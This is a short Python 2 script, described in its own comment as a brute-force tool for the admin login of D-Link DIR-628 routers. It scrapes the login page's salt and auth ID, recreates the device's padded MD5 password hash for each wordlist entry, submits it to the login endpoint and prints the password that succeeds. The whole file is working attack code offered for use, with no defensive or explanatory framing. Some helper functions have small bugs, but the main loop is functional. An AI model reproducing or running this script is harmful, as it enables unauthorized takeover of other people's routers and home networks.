#!/bin/python
'''
Lets make a dlink dir-628 admin brute force program
'''

import os, sys, hashlib, urllib2



def pad16(passwd):
    i = len(passwd)
    if i > 16:
        passwd = passwd[0:15]
    while i < 16:
        passwd += chr(1)
        i += 1

    return passwd

def pad63(salt,passwd):
    passwd = salt + passwd
    i = len(passwd)
    while i < 63:
        passwd += chr(1)
        i += 1
    return passwd

def padadmin(passwd):
    passwd += chr(1)
    return passwd

def hashthepass(salt, passwd):
    hashobj = hashlib.md5(passwd)
    hashpass = hashobj.hexdigest()
    hashpass =  salt + hashpass
    
    return hashpass

def makehash(passwd, salt):
    passwd = pad16(passwd)
    passwd = pad63(salt,passwd)
    passwd = padadmin(passwd)
    hashpass = hashthepass(salt, passwd)
    return hashpass

def makefile():
    hashfile = open('/root/dlinkhash.txt','w')
    rockyou = open('/usr/share/wordlists/rockyou.txt', 'r')
    for line in rockyou:
        hashpass = makehash(line)
        hashfile.write(hashpass + '\n')
    hashfile.close()
    rockyou.close()

def getparams():
    salt = ''
    authid = ''
    try:
        response = urllib2.urlopen("http://" + sys.argv[1])
        html = response.read()
        htmlsplit = html.split('\n')
        for line in htmlsplit:
            if "salt =" in line:
                salttmp = line.split('"')
                salt = salttmp[1]
            if "auth_id" in line:
                authidline = line.split("=")
                authid = authidline[3][:-3]
        if (salt == '') or (auth_id == ''):
            print "Not a D-Link DIR-628 or compatible device"
            exit()
    except:
        print "Device " + sys.argv[1] + " is not responding or other error occurred"
        exit()
    return salt, authid

def loophash():
    salt = ''
    authid = ''
    passfile = open(sys.argv[2], 'r')
    for line in passfile:
        line = line.strip()
        salt, authid = getparams()
        hash = makehash(line, salt)
        try:
            loginurl = "http://" + sys.argv[1] + "/post_login.xml?hash=" + hash + "&auth_code=&auth_id=" + authid
            response = urllib2.urlopen(loginurl)
            htmlresponse = response.read()
            htmlresponse = str(htmlresponse)
            if ("error" in htmlresponse):
                pass
            else:
                print "Password is:  " + line
                exit()
        except:
            print 'Something went wrong with the site, maybe crashed'
            exit()

def printhash():
    return makehash(sys.argv[1])


loophash()
